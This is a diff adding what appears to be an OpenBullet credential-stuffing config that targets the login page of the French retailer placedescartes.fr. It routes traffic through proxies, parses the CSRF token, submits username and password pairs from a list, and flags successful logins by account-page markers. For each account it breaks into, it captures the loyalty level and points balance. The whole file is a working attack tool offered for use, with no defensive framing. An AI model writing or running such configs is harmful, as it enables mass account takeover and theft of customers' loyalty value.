@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "placedescarteso",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-11T03:22:51.672667+00:00",
+  "AdditionalInfo": "",
+  "Author": "DivineGhostMa",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.placedescartes.fr/connexion" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#_Token PARSE "<SOURCE>" LR "\"><input name=\"_token\" type=\"hidden\" value=\"" "\">" Recursive=FALSE -> VAR "_Token" "" "" 
+REQUEST POST "https://www.placedescartes.fr/connexion" AutoRedirect=TRUE 
+  CONTENT "_token=<_Token>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY ">Mon Compte</span></a>" 
+    KEY ">Gérer mon compte</a></li>" 
+    KEY ">Déconnexion</a></li>" 
+  KEYCHAIN Failure OR 
+    KEY "Aucun compte avec ces identifiants." 
+REQUEST GET "https://www.placedescartes.fr/mon-compte" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Level PARSE "<SOURCE>" LR "<span class=\"statut_img_avatar\">" "</span>" Recursive=FALSE -> CAP "Level" "" "" 
+#Points PARSE "<SOURCE>" CSS "body > main > div.content-wrapper > div.content > div > div.ct > div.content-loyalty > div > p:nth-child(1) > span" "innerHTML" 0 -> CAP "Points" "" "" 
